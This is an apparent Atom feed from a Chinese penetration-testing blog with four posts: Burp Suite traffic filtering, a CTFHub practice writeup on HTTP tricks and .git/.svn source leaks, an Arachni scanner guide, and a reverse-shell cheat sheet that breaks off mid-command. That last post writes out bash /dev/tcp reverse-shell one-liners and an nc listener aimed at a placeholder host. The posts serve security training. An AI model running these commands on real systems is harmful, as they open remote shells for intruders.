<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>madcoding’s blog</title>
  
  <subtitle>学习，沉淀，分享，交流</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.mad-coding.cn/"/>
  <updated>2020-03-06T06:59:58.969Z</updated>
  <id>https://www.mad-coding.cn/</id>
  
  <author>
    <name>madcoding</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>burp总是抓到无用包的困扰</title>
    <link href="https://www.mad-coding.cn/2020/03/06/burp%E6%80%BB%E6%98%AF%E6%8A%93%E5%88%B0%E6%97%A0%E7%94%A8%E5%8C%85%E7%9A%84%E5%9B%B0%E6%89%B0/"/>
    <id>https://www.mad-coding.cn/2020/03/06/burp总是抓到无用包的困扰/</id>
    <published>2020-03-06T06:48:23.000Z</published>
    <updated>2020-03-06T06:59:58.969Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>我们在渗透测试的过程中，经常会使用火狐或者谷歌去+burpsuite对站点进行测试，但是在测试的过程中burpsuite经常抓到火狐浏览器自身的数据包或者其他无用的数据包，这就对我们工作的效率大有影响，所以这里来告诉大家如何解决此类问题。</p><a id="more"></a><h1 id="0x01-问题案例"><a href="#0x01-问题案例" class="headerlink" title="0x01 问题案例"></a>0x01 问题案例</h1><p>burp的历史数据包中，有大量的火狐请求包</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200306145002.png" class="lozad"></p><h1 id="0x02-解决方法"><a href="#0x02-解决方法" class="headerlink" title="0x02 解决方法"></a>0x02 解决方法</h1><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>针对火狐浏览器的解决方法</p><p>1.在firefox（火狐浏览器）地址栏中输入：</p><p>about:config</p><p>2.然后出现搜索框，搜索以下内容，双击将它设置成false。</p><p>network.captive-portal-service</p><p><img alt="img" data-src="https://img-blog.csdnimg.cn/20200306143850139.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pbGt3YXkyMDEz,size_16,color_FFFFFF,t_70" class="lozad"></p><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>该方法是通用的方法，通过设置burpsuite的拦截规则来实现。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200306145657.png" class="lozad"></p><p>添加规则</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200306145752.png" class="lozad"></p><blockquote><p>火狐浏览器正则表达式：(mozilla.com$|firefox.com$|firefoxchina.cn$)</p></blockquote><p>这个表达式规则的意思就是不拦截请求域名以mozilla.com、firefox.com、firefoxchina.cn为结尾的请求。</p><p>设置好后，问题即可解决。</p><h1 id="0x03-参考连接"><a href="#0x03-参考连接" class="headerlink" title="0x03 参考连接"></a>0x03 参考连接</h1><p><a href="https://www.cnblogs.com/blili/p/10948331.html" target="_blank" rel="noopener">https://www.cnblogs.com/blili/p/10948331.html</a></p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;我们在渗透测试的过程中，经常会使用火狐或者谷歌去+burpsuite对站点进行测试，但是在测试的过程中burpsuite经常抓到火狐浏览器自身的数据包或者其他无用的数据包，这就对我们工作的效率大有影响，所以这里来告诉大家如何解决此类问题。&lt;/p&gt;
    
    </summary>
    
      <category term="疑难杂症" scheme="https://www.mad-coding.cn/categories/%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87/"/>
    
    
      <category term="burp" scheme="https://www.mad-coding.cn/tags/burp/"/>
    
      <category term="抓包" scheme="https://www.mad-coding.cn/tags/%E6%8A%93%E5%8C%85/"/>
    
  </entry>
  
  <entry>
    <title>CTFHUB练习writeup</title>
    <link href="https://www.mad-coding.cn/2020/03/02/CTFHUB%E7%BB%83%E4%B9%A0writeup/"/>
    <id>https://www.mad-coding.cn/2020/03/02/CTFHUB练习writeup/</id>
    <published>2020-03-02T05:59:20.000Z</published>
    <updated>2020-03-03T07:55:08.006Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>CTF是啥我这里就不介绍了，最近在网上看到了一个CTFHUB的练习平台，感觉还挺好玩的，虽然靶场的环境还有问题，不过可以刷刷现在已有的题目玩玩。</p><p>网址：<a href="https://www.ctfhub.com/#/index" target="_blank" rel="noopener">https://www.ctfhub.com/#/index</a></p><a id="more"></a><h1 id="0x01-web"><a href="#0x01-web" class="headerlink" title="0x01 web"></a>0x01 web</h1><h2 id="1-1-HTTP协议"><a href="#1-1-HTTP协议" class="headerlink" title="1.1 HTTP协议"></a>1.1 HTTP协议</h2><h3 id="1-1-1-请求方式"><a href="#1-1-1-请求方式" class="headerlink" title="1.1.1 请求方式"></a>1.1.1 请求方式</h3><p>使用burp抓包，然后发送到repeater模块，将请求方式改为CTFHUB点击GO即可返回flag</p><h3 id="1-1-2-302跳转"><a href="#1-1-2-302跳转" class="headerlink" title="1.1.2 302跳转"></a>1.1.2 302跳转</h3><p>使用burp抓包，然后发送到repeater模块，go一下，在请求的返回包中会发现一串数字，添加到request请求url路径的index.html前面在go一下，获得flag</p><h3 id="1-1-3-Cookie"><a href="#1-1-3-Cookie" class="headerlink" title="1.1.3 Cookie"></a>1.1.3 Cookie</h3><p>使用burp抓包,然后发送到repeater模块，修改cookie的值,将admin=0改为admin=1,go一下,获得flag</p><h3 id="1-1-4-基础认证"><a href="#1-1-4-基础认证" class="headerlink" title="1.1.4 基础认证"></a>1.1.4 基础认证</h3><p>开启环境,题目情况如下</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200302140530.png" class="lozad"></p><p>下载附件，里面是密码TOP100</p><p>访问连接，发现是类似Tomcat的认证访问，所以使用burp抓包看看</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200302140903.png" class="lozad"></p><p>burp抓包后发送到repeater模块go一下返回401未授权</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200302141340.png" class="lozad"></p><p>将数据包发送到intruder模块</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200302141418.png" class="lozad"></p><p>设置payload类型</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200302141432.png" class="lozad"></p><p>设置第一个位置的payload</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200302141451.png" class="lozad"></p><p>设置第二个位置的payload</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200302141503.png" class="lozad"></p><p>设置第三个位置的payload</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200302141514.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200302141521.png" class="lozad"></p><p> 因为爆破的时候会将字符URL编码了，所以需要将那个选项去掉</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200302141535.png" class="lozad"></p><p>开始爆破</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200302141551.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200302141559.png" class="lozad"></p><h3 id="1-1-5响应包源码"><a href="#1-1-5响应包源码" class="headerlink" title="1.1.5响应包源码"></a>1.1.5响应包源码</h3><p>打开链接发现是贪吃蛇界面，而题目考的是响应包源代码，想一下一般响应包都是网页源代码，所以这里是不是找查看源代码尼？</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200302141612.png" class="lozad"></p><p>右击查看源代码，发现flag果然以注释的形式出现在哎源代码中。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200302141626.png" class="lozad"></p><h1 id="0x02-信息泄露"><a href="#0x02-信息泄露" class="headerlink" title="0x02 信息泄露"></a>0x02 信息泄露</h1><h2 id="2-1-git泄露"><a href="#2-1-git泄露" class="headerlink" title="2.1 git泄露"></a>2.1 git泄露</h2><h3 id="2-1-1-Index"><a href="#2-1-1-Index" class="headerlink" title="2.1.1 Index"></a>2.1.1 Index</h3><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200302163414.png" class="lozad"></p><p>打开链接</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200302163434.png" class="lozad"></p><p>目录扫描</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200302163440.png" class="lozad"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python</span><br><span class="line">GitHack.py http://challenge-86d4bdd4069b1836.sandbox.ctfhub.com:10080/.git/</span><br></pre></td></tr></table></figure><p>在下载下来的源码中找到flag</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200302163519.png" class="lozad"></p><h3 id="2-1-2-LOG"><a href="#2-1-2-LOG" class="headerlink" title="2.1.2 LOG"></a>2.1.2 LOG</h3><blockquote><p>考点是</p><ul><li>git 泄露</li><li>查看历史记录：git log</li><li>切换版本: git reset 版本hash</li><li>对比两次提交 : git diff</li></ul></blockquote><p>解题</p><p>使用dirb进行扫描，发现存在.git目录，</p><p>使用githack工具将项目克隆到本地</p><p>工具地址：<a href="https://github.com/BugScanTeam/GitHack" target="_blank" rel="noopener">https://github.com/BugScanTeam/GitHack</a></p><blockquote><p>注：这个有个坑，我一开始使用的<code>lijiejie</code>的<code>GitHack</code>，git下来的源码没有.git文件夹，所以git log查看版本等命令都用不了，一开始我以为是环境出了问题，后来看到官方的writeup中使用的工具不是<code>lijiejie</code>的，所以在<code>github</code>中找了<code>BugScanTeam</code>的工具进行使用</p></blockquote><p>1.克隆到本地</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200302162407.png" class="lozad"></p><p>2.查看提交日志信息</p><p>进入克隆的代码目录中，在此处打开<code>cmd</code>命令行，输入<code>git log</code>查看提交的日志情况，这里使用git bash打开也行。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200302162530.png" class="lozad"></p><p>3.版本对比</p><p>观察发现一共有三次提交，分别是init, add flag 和remove flag.</p><p>直接与add flag这次提交进行对比，命令是：git diff 2bba2d</p><blockquote><p>注：abba2d是add flag这次提交的hash，会变化的。为什么，我也不知道（手动狗头）</p></blockquote><p>4.拿flag</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200302162618.png" class="lozad"></p><p><strong>另一种官方解法</strong></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200302162640.png" class="lozad"></p><h3 id="2-1-3-Stash"><a href="#2-1-3-Stash" class="headerlink" title="2.1.3 Stash"></a>2.1.3 Stash</h3><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200302163556.png" class="lozad"></p><p>一样的套路，先探测是否存在.git目录，然后使用gitHack工具拉取代码</p><p>1.查看版本提交情况</p><p>发现和LOG一样，</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200302162832.png" class="lozad"></p><p>2.版本对比一下</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200302163004.png" class="lozad"></p><p>发下有个txt文件，那flag会不会在这个txt文件里面尼？</p><p>3.恢复文件</p><p>输入git stash pop恢复这个文件</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200302163052.png" class="lozad"></p><p>4.拿flag</p><p>dir查看文件目录，发现txt文件恢复成功</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200302163215.png" class="lozad"></p><p>使用notepad命令打开txt文件，拿到flag</p><p><img alt="1583137972616" data-src="C:%5CUsers%5Cmadcoding%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1583137972616.png" class="lozad"></p><p><strong>另种解法</strong></p><p>直接到stash目录下查看hash</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200302163337.png" class="lozad"></p><p>然后使用git diff命令对比hash，和第一个LOG的做法思路一样</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200302163348.png" class="lozad"></p><h3 id="2-1-4-git泄露总结"><a href="#2-1-4-git泄露总结" class="headerlink" title="2.1.4 git泄露总结"></a>2.1.4 git泄露总结</h3><p><strong>漏洞描述：</strong></p><p>git是一套内容寻址文件系统，当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。</p><p><strong>漏洞风险</strong></p><p>泄漏Web程序源代码，尤其是生产环境中的Web源代码是非常严重的，首先源代码中大概率包含了连接数据库的用户密码等敏感信息，其次非开源的商业代码可能就这样被他人窃取，再者有的站长可能为了方便管理留有Webshell之类的后门</p><p><strong>漏洞修复</strong></p><ol><li>删除.git目录或者修改中间件配置进行对.git隐藏文件夹的访问、</li><li>增加防火墙规则</li></ol><p><strong>.git文件夹分析</strong></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200302163739.png" class="lozad"></p><ol><li>hooks:存放一些sheel的地方</li><li>info:存放仓库的信息</li><li>logs:存放仓库的多次提交信息</li><li>object:存放所有git对象的地方</li><li>refs:存放提交hash的地方</li><li>config: github的配置信息</li><li>description:仓库的描述信息，主要给gitweb等git托管系统使用</li><li>HEAD:映射到ref引用，能够找到下一次commit的前一次哈希值</li><li>ORIG_HEAD:</li></ol><p>git命令学习：<a href="https://www.cnblogs.com/lwzz/archive/2013/02/23/2921426.html" target="_blank" rel="noopener">传送门</a></p><p><strong>githack工具原理</strong></p><p>它能解析 .git/index 文件，并找到工程中所有的：文件名和文件 sha1，然后去 .git/objects/ 文件夹下下载对应的文件，通过 zlib 解压文件，按原始的目录结构写入源代码。</p><h3 id="2-1-5-参考连接"><a href="#2-1-5-参考连接" class="headerlink" title="2.1.5 参考连接"></a>2.1.5 参考连接</h3><ol><li><p><a href="https://blog.csdn.net/qq_43504939/article/details/95807716" target="_blank" rel="noopener">https://blog.csdn.net/qq_43504939/article/details/95807716</a></p></li><li><p><a href="https://writeup.ctfhub.com/Skill/Web/信息泄露/Git/83dcefb7.html" target="_blank" rel="noopener">https://writeup.ctfhub.com/Skill/Web/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/Git/83dcefb7.html</a></p></li><li><p><a href="https://writeup.ctfhub.com/Skill/Web/信息泄露/Git/83dcefb9.html" target="_blank" rel="noopener">https://writeup.ctfhub.com/Skill/Web/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/Git/83dcefb9.html</a></p></li></ol><h2 id="2-2-svn泄露"><a href="#2-2-svn泄露" class="headerlink" title="2.2 .svn泄露"></a>2.2 .svn泄露</h2><h3 id="2-2-3-svn泄露总结"><a href="#2-2-3-svn泄露总结" class="headerlink" title="2.2.3 .svn泄露总结"></a>2.2.3 .svn泄露总结</h3><p><strong>漏洞描述</strong></p><p>SVN是一个开放源代码的版本控制系统。在使用SVN管理本地代码过程中，会自动生成一个名为.svn的隐藏文件夹，其中包含重要的源代码信息。网站管理员在发布代码时，没有使用‘导出’功能，而是直接复制代码文件夹到WEB服务器上，这就使.svn隐藏文件夹被暴露于外网环境，可以利<br>用.svn/entries文件，获取到服务器源码</p><h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h1><h1 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h1><p>### </p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;CTF是啥我这里就不介绍了，最近在网上看到了一个CTFHUB的练习平台，感觉还挺好玩的，虽然靶场的环境还有问题，不过可以刷刷现在已有的题目玩玩。&lt;/p&gt;
&lt;p&gt;网址：&lt;a href=&quot;https://www.ctfhub.com/#/index&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.ctfhub.com/#/index&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Arachni扫描器的安装与使用</title>
    <link href="https://www.mad-coding.cn/2020/02/28/Arachni%E6%89%AB%E6%8F%8F%E5%99%A8%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
    <id>https://www.mad-coding.cn/2020/02/28/Arachni扫描器的安装与使用/</id>
    <published>2020-02-28T07:38:19.000Z</published>
    <updated>2020-02-28T09:44:59.958Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在渗透测试的过程中，除了去手工测试以外，有时候还需要用扫描器来进行扫描测试，出了APPSCAN、AVWS、netsparker这样的大型扫描器，今天来给大家介绍另一款web扫描器Arachni。这款扫描器挺好用的，不过现在作者已经停止维护了。</p><a id="more"></a><h1 id="0x01-Arachni扫描器介绍"><a href="#0x01-Arachni扫描器介绍" class="headerlink" title="0x01 Arachni扫描器介绍"></a>0x01 Arachni扫描器介绍</h1><p>Arachni是一个包含很多特性、模块化的、高性能的Ruby框架，目的是帮助渗透测试人员和管理者评估现代web应用程序的安全。Arachni是免费、源代码开源的，它支持所有主流操作系统，如：Windows、Mac OS X 、Linux，通过便携式可移植包的形式进行分发，使其满足即时部署的要求。Arachni可导出评估报告。</p><p>Arachni是一个能够满足很多使用场景的通用的安全扫描框架，范围覆盖非常广，既包括小到一个命令行指令的扫描，又包括高性能的网格扫描、脚本认证审计、多用户多web合作平台。此外，它简单的REST API使集成变得轻而易举。</p><p>最后，由于其集成的浏览器环境，Arachni可以支持高度复杂的web应用程序，这些应用程序大量使用JavaScript、HTML5、DOM操纵和AJAX等技术。Arachni为现代web应用程序技术提供一流的覆盖率、漏洞检测和准确性</p><h1 id="0x02-下载安装"><a href="#0x02-下载安装" class="headerlink" title="0x02 下载安装"></a>0x02 下载安装</h1><h2 id="2-1-linux下安装"><a href="#2-1-linux下安装" class="headerlink" title="2.1 linux下安装"></a>2.1 linux下安装</h2><p>下载：<a href="http://www.arachni-scanner.com/download/" target="_blank" rel="noopener">传送门</a></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200228161611.png" class="lozad"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#解压缩包</span></span><br><span class="line">tar -zxvf arachni-1.5.1-0.5.12-linux-x86_64.tar.gz </span><br><span class="line"><span class="built_in">cd</span> arachni-1.5.1-0.5.12/ <span class="comment">#进入arachni目录</span></span><br><span class="line"><span class="built_in">cd</span> bin <span class="comment">#进入bin目录</span></span><br></pre></td></tr></table></figure><p>运行</p><p>arachni有两种运行模式，一种是web模式，一种是命令行模式</p><p>命令行模式</p><blockquote><p>在bin目录下运行：  ./arachni_console</p></blockquote><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200228164009.png" class="lozad"></p><p>web模式</p><blockquote><p>在bin目录下运行：  ./arachni_web</p></blockquote><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200228163828.png" class="lozad"></p><p>使用浏览器访问 <a href="http://localhost:9292/" target="_blank" rel="noopener">http://localhost:9292/</a></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200228164656.png" class="lozad"></p><p>账号密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#管理员账号密码</span></span><br><span class="line">E-mail: `admin@admin.admin`</span><br><span class="line">Password: `administrator`</span><br><span class="line"></span><br><span class="line"><span class="comment">#普通账号密码</span></span><br><span class="line">E-mail: `user@user.user`</span><br><span class="line">Password: `regular_user</span><br></pre></td></tr></table></figure><h2 id="2-2-Windows下安装"><a href="#2-2-Windows下安装" class="headerlink" title="2.2 Windows下安装"></a>2.2 Windows下安装</h2><p>下载：<a href="http://www.arachni-scanner.com/download/" target="_blank" rel="noopener">传送门</a></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200228171114.png" class="lozad"></p><p>解压</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200228170110.png" class="lozad"></p><p>两种工作模式</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200228170225.png" class="lozad"></p><p>本文中使用的是web应用模式，双击arachni_web.bat，在浏览器中访问<a href="http://localhost:9292/" target="_blank" rel="noopener">http://localhost:9292/</a> </p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200228170402.png" class="lozad"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#管理员账号密码</span></span><br><span class="line">E-mail: `admin@admin.admin`</span><br><span class="line">Password: `administrator`</span><br><span class="line"></span><br><span class="line"><span class="comment">#普通账号密码</span></span><br><span class="line">E-mail: `user@user.user`</span><br><span class="line">Password: `regular_user</span><br></pre></td></tr></table></figure><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200228170448.png" class="lozad"></p><h1 id="0x03-使用"><a href="#0x03-使用" class="headerlink" title="0x03 使用"></a>0x03 使用</h1><p>使用大致流程图</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200228171453.png" class="lozad"></p><h2 id="3-1-配置策略"><a href="#3-1-配置策略" class="headerlink" title="3.1 配置策略"></a>3.1 配置策略</h2><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200228171826.png" class="lozad"></p><h3 id="3-1-1-策略基本信息"><a href="#3-1-1-策略基本信息" class="headerlink" title="3.1.1 策略基本信息"></a>3.1.1 策略基本信息<img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200228172316.png" class="lozad"></h3><h3 id="3-1-2-HTTP设置"><a href="#3-1-2-HTTP设置" class="headerlink" title="3.1.2 HTTP设置"></a>3.1.2 HTTP设置</h3><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200228172957.png" class="lozad"></p><h3 id="3-1-3-指纹识别"><a href="#3-1-3-指纹识别" class="headerlink" title="3.1.3 指纹识别"></a>3.1.3 指纹识别</h3><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200228173056.png" class="lozad"></p><h3 id="3-1-4-主动扫描"><a href="#3-1-4-主动扫描" class="headerlink" title="3.1.4 主动扫描"></a>3.1.4 主动扫描</h3><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200228173330.png" class="lozad"></p><h3 id="3-1-5-被动扫描"><a href="#3-1-5-被动扫描" class="headerlink" title="3.1.5 被动扫描"></a>3.1.5 被动扫描</h3><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200228173250.png" class="lozad"></p><h3 id="3-1-6-插件选择"><a href="#3-1-6-插件选择" class="headerlink" title="3.1.6 插件选择"></a>3.1.6 插件选择</h3><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200228173349.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200228173625.png" class="lozad"></p><h2 id="3-2-问题报错"><a href="#3-2-问题报错" class="headerlink" title="3.2 问题报错"></a>3.2 问题报错</h2><p>扫描的过程突然报错</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200228160013.png" class="lozad"></p><p><strong>解决方法</strong></p><p>在<strong>arachni-1.5.1-0.5.12/system/</strong> environment 文件末尾下追加 <code>export OPENSSL_CONF=&quot;/etc/ssl/&quot;</code></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200228161223.png" class="lozad"></p><p>然后重启服务，这里不知道如何重启服务，就直接重启电脑了</p><h1 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h1><p><a href="https://blog.csdn.net/a1766855068/article/details/89225657" target="_blank" rel="noopener">https://blog.csdn.net/a1766855068/article/details/89225657</a></p><p><a href="https://blog.csdn.net/qiushisoftware/article/details/87085136" target="_blank" rel="noopener">https://blog.csdn.net/qiushisoftware/article/details/87085136</a></p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;在渗透测试的过程中，除了去手工测试以外，有时候还需要用扫描器来进行扫描测试，出了APPSCAN、AVWS、netsparker这样的大型扫描器，今天来给大家介绍另一款web扫描器Arachni。这款扫描器挺好用的，不过现在作者已经停止维护了。&lt;/p&gt;
    
    </summary>
    
      <category term="神兵利器" scheme="https://www.mad-coding.cn/categories/%E7%A5%9E%E5%85%B5%E5%88%A9%E5%99%A8/"/>
    
    
      <category term="扫描器" scheme="https://www.mad-coding.cn/tags/%E6%89%AB%E6%8F%8F%E5%99%A8/"/>
    
      <category term="Arachni" scheme="https://www.mad-coding.cn/tags/Arachni/"/>
    
  </entry>
  
  <entry>
    <title>反弹shell的N种姿势</title>
    <link href="https://www.mad-coding.cn/2020/02/24/%E5%8F%8D%E5%BC%B9shell%E7%9A%84N%E7%A7%8D%E5%A7%BF%E5%8A%BF/"/>
    <id>https://www.mad-coding.cn/2020/02/24/反弹shell的N种姿势/</id>
    <published>2020-02-24T02:33:15.000Z</published>
    <updated>2020-02-24T03:32:06.792Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在渗透测试的过程中，在拿到webshell以后，如果目标主机是Windows主机，则是通过开3389端口在远程连接，如果目标主机是linux服务器，一般我们都会选择反弹shell来进行操作。在这里总结下反弹shell常见的几种姿势。</p><a id="more"></a><h1 id="0x01-Bash反弹"><a href="#0x01-Bash反弹" class="headerlink" title="0x01 Bash反弹"></a>0x01 Bash反弹</h1><h2 id="1-1-方法一"><a href="#1-1-方法一" class="headerlink" title="1.1 方法一"></a>1.1 方法一</h2><p>攻击者主机上执行监听：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp port</span><br></pre></td></tr></table></figure><p>目标主机上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/x.x.x.x/port 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"><span class="comment">#bash -i   打开一个交互的bash</span></span><br><span class="line"><span class="comment">#&gt;&amp;   将标准错误输出重定向到标准输出</span></span><br><span class="line"><span class="comment">#/dev/tcp/x.x.x.x/port   意为调用socket,建立socket连接,其中x.x.x.x为要反弹到的主机ip，port为端口</span></span><br><span class="line"><span class="comment">#0&gt;&amp;1   标准输入重定向到标准输出，实现你与反弹出来的shell的交互</span></span><br></pre></td></tr></table></figure><blockquote><p>注：<strong>/dev/tcp/</strong> 是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在/dev/udp/。</p></blockquote><p>inux shell下常用的文件描述符是：</p><p>1.标准输入 (stdin) ：代码为 0 ，使用 &lt; 或 &lt;&lt; ；</p><p>2.标准输出 (stdout)：代码为 1 ，使用 &gt; 或 &gt;&gt; ；</p><p>3.标准错误输出(stderr)：代码为 2 ，使用 2&gt; 或 2&gt;&gt;。</p><p>另外由于不同Linux发行版之间的差异，该命令在某些系统上可能并不适用。</p><h2 id="1-2-方法二"><a href="#1-2-方法二" class="headerlink" title="1.2 方法二"></a>1.2 方法二</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> 0&amp;0 2&gt;&amp;0</span><br><span class="line"></span><br><span class="line">0&lt;&amp;196;<span class="built_in">exec</span> 196&lt;&gt;/dev/tcp/x.x.x.x/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br><span class="line"></span><br><span class="line">/bin/bash  -i &gt; 